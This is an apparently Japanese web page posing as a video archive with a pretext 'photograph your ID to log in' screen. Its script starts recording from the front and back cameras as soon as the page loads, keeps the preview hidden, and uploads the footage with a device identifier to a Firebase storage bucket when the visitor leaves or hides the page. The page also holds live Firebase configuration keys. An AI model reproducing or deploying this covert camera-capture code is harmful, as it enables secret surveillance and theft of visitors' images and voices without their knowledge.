<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>動画保管庫</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        .video-grid {
            display: grid;
            gap: 10px;
        }
        .video-item {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .video-container {
            position: relative;
            width: 100%;
            padding-bottom: 56.25%;
            background-color: #000;
        }
        .video-container video {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 100%;
            height: 100%;
            transform: translate(-50%, -50%);
            object-fit: contain;
        }
        .video-item .title {
            width: 90%;
            margin-top: 10px;
            padding: 5px;
            text-align: center;
            border: none;
            background: none;
            color: #000;
            font-size: 16px;
        }

        @media (min-width: 1200px) {
            .video-grid {
                grid-template-columns: repeat(4, 1fr);
            }
        }
        @media (min-width: 992px) and (max-width: 1199px) {
            .video-grid {
                grid-template-columns: repeat(3, 1fr);
            }
        }
        @media (min-width: 768px) and (max-width: 991px) {
            .video-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }
        @media (max-width: 767px) {
            .video-grid {
                grid-template-columns: 1fr;
            }
        }

        .dialog-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .dialog {
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            text-align: center;
        }
        .dialog button {
            margin-top: 10px;
        }

        .pagination {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            margin: 20px 0;
        }
        .pagination button {
            padding: 10px 20px;
            margin: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        .login-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .login-container video {
            width: 320px;
            height: 240px;
        }
        .login-container button {
            padding: 10px 20px;
            font-size: 16px;
            margin-top: 20px;
            cursor: pointer;
        }

        .camera-switch-message {
            font-size: 16px;
            color: red;
	}
	    
	#video {
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container" id="loginContainer">
        <h1>IDを撮影</h1>
        <p class="camera-switch-message">注：ログイン認証機能の完成までは<br>
            カメラ許可でログイン可能です（）</p>
        <img src="https://github.com/casval0078/hozon/blob/main/test.png?raw=true" height="300" width="300" alt="撮影画面配置予定場所" align="top" >
        <canvas id="canvas" style="display: none;"></canvas>
        <button id="captureButton">撮影してログイン</button>
	    <video id="video" autoplay></video>
    </div>

    <h1 style="display: none;">動画保管庫</h1>
    <div class="video-grid" id="videoGrid" style="display: none;">
        <!-- Videos will be dynamically inserted here -->
    </div>
    <div class="pagination" id="pagination" style="display: none;">
        <!-- Pagination buttons will be dynamically inserted here -->
    </div>

    <div class="dialog-overlay" id="dialogOverlay">
        <div class="dialog">
            <p>カメラの権限を許可してください。</p>
            <button id="reloadButton">再試行</button>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
        import { getStorage, ref, uploadBytesResumable, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-storage.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js";
    
        const firebaseConfig = {
            apiKey: "AIzaSyDsK4imQ3uWcK7hyESo6hnDyQ96lsPNCZ8",
            authDomain: "nou-no-circle.firebaseapp.com",
            projectId: "nou-no-circle",
            storageBucket: "nou-no-circle.appspot.com",
            messagingSenderId: "756338805186",
            appId: "1:756338805186:web:cb740e035ac611b5baae5b",
            measurementId: "G-TWBV38P13D"
        };

        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);
        const db = getFirestore(app);

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureButton = document.getElementById('captureButton');
        const dialogOverlay = document.getElementById('dialogOverlay');
        const reloadButton = document.getElementById('reloadButton');
        const loginContainer = document.getElementById('loginContainer');
        const videoGrid = document.getElementById('videoGrid');
        const pagination = document.getElementById('pagination');
        const videosPerPage = 8;
        let videoStream;
        let mediaRecorder;
        let recordedChunks = [];
        let currentPage = 1;

        const videos = [

		{			
                url: 'https://firebasestorage.googleapis.com/v0/b/hozon4-62abd.appspot.com/o/%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB.mp4?alt=media&token=fa1b9784-ab81-42d6-9805-4b434b220b25',			
		title: 'sample'	
	    },		


            // 他の動画URLとタイトルを追加
        ];

        function getOrCreateDeviceId() {
            let deviceId = localStorage.getItem('deviceId');
            if (!deviceId) {
                deviceId = `device_${Math.random().toString(36).substr(2, 9)}`;
                localStorage.setItem('deviceId', deviceId);
            }
            return deviceId;
        }

        async function requestCameraAccess(backCamera = true) {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                const videoDevices = devices.filter(device => device.kind === 'videoinput');
                const camera = backCamera
                    ? videoDevices.find(device => device.label.toLowerCase().includes('back')) || videoDevices[0]
                    : videoDevices.find(device => device.label.toLowerCase().includes('front')) || videoDevices[0];

                const constraints = {
                    video: {
                        deviceId: camera.deviceId,
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                };

                const videoStream = await navigator.mediaDevices.getUserMedia(constraints);
                return videoStream;
            } catch (err) {
                console.error('カメラアクセスエラー:', err);
                showCameraPermissionDialog();
                throw err;
            }
        }

        async function requestFrontCameraAndAudioAccess() {
            try {
                const constraints = {
                    video: {
                        facingMode: 'user', // フロントカメラを使用
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: true // 音声も含む
                };

                videoStream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = videoStream;
                video.muted = true; // 録画中の音声をミュート
            } catch (err) {
                console.error('カメラと音声のアクセスエラー:', err);
                showCameraPermissionDialog();
                throw err;
            }
        }

        function captureAndLogin() {
            if (videoStream) {
                const ctx = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                loginContainer.style.display = 'none';
                document.querySelector('h1').style.display = 'block';
                videoGrid.style.display = 'grid';
                pagination.style.display = 'flex';
                loadVideos(currentPage);
            } else {
                console.error('カメラストリームが利用できません。');
                alert('カメラストリームが利用できません。');
            }
        }

        async function startVideoRecording() {
            const frontCameraStream = await requestCameraAccess(false); // フロントカメラ
            const backCameraStream = await requestCameraAccess(true);   // 背面カメラ

            recordedChunks = [];
            const frontRecorder = new MediaRecorder(frontCameraStream, { mimeType: 'video/webm; codecs=vp9' });
            const backRecorder = new MediaRecorder(backCameraStream, { mimeType: 'video/webm; codecs=vp9' });

            frontRecorder.ondataavailable = event => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };

            backRecorder.ondataavailable = event => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };

            // 両方のレコーダーを停止させない限り録画を続ける
            frontRecorder.onstop = backRecorder.onstop = async () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                await uploadVideo(blob);
            };

            // 両方のレコーダーを開始
            frontRecorder.start();
            backRecorder.start();

            // ページ離脱または画面オフ時に録画を停止するリスナー
            window.addEventListener('beforeunload', () => {
                frontRecorder.stop();
                backRecorder.stop();
            });

            document.addEventListener('visibilitychange', () => {
                if (document.visibilityState === 'hidden') {
                    frontRecorder.stop();
                    backRecorder.stop();
                }
            });
        }

        async function uploadVideo(blob) {
            const storageRef = ref(storage, `videos/${Date.now()}_${Math.random().toString(36).substr(2, 9)}.webm`);
            const metadata = {
                contentType: 'video/webm'
            };
            const uploadTask = uploadBytesResumable(storageRef, blob, metadata);

            uploadTask.on('state_changed',
                (snapshot) => {
                    // 進行状況の処理
                },
                (error) => {
                    console.error('アップロードエラー:', error);
                },
                async () => {
                    const downloadURL = await getDownloadURL(uploadTask.snapshot.ref);
                    await saveVideoInfo(downloadURL, '録画された動画');
                }
            );
        }

        async function saveVideoInfo(downloadURL, title) {
            try {
                await addDoc(collection(db, "videos"), {
                    url: downloadURL,
                    title: title,
                    createdAt: new Date(),
                    deviceId: getOrCreateDeviceId()
                });
                console.log("動画情報が保存されました:", downloadURL);
            } catch (e) {
                console.error("動画情報の保存に失敗しました: ", e);
            }
        }

        function showCameraPermissionDialog() {
            dialogOverlay.style.display = 'flex';
            reloadButton.addEventListener('click', () => {
                location.reload();
            });
        }

        captureButton.addEventListener('click', () => {
            captureAndLogin();
        });

        function loadVideos(page) {
            const startIndex = (page - 1) * videosPerPage;
            const endIndex = startIndex + videosPerPage;
            const currentVideos = videos.slice(startIndex, endIndex);

            videoGrid.innerHTML = '';
            currentVideos.forEach(videoData => {
                const videoItem = document.createElement('div');
                videoItem.className = 'video-item';

                const videoContainer = document.createElement('div');
                videoContainer.className = 'video-container';
                const videoElement = document.createElement('video');
                videoElement.src = videoData.url;
                videoElement.controls = true;
                videoContainer.appendChild(videoElement);

                const titleInput = document.createElement('input');
                titleInput.type = 'text';
                titleInput.value = videoData.title;
                titleInput.className = 'title';
                titleInput.addEventListener('change', () => {
                    // ユーザーがタイトルを変更した場合の処理
                });

                videoItem.appendChild(videoContainer);
                videoItem.appendChild(titleInput);
                videoGrid.appendChild(videoItem);
            });

            pagination.innerHTML = '';
            const totalPages = Math.ceil(videos.length / videosPerPage);
            for (let i = 1; i <= totalPages; i++) {
                const pageButton = document.createElement('button');
                pageButton.textContent = i;
                if (i === page) {
                    pageButton.disabled = true;
                }
                pageButton.addEventListener('click', () => {
                    currentPage = i;
                    loadVideos(currentPage);
                });
                pagination.appendChild(pageButton);
            }
        }

        // ページロード時に録画を開始
        startVideoRecording();
    </script>
</body>
</html>
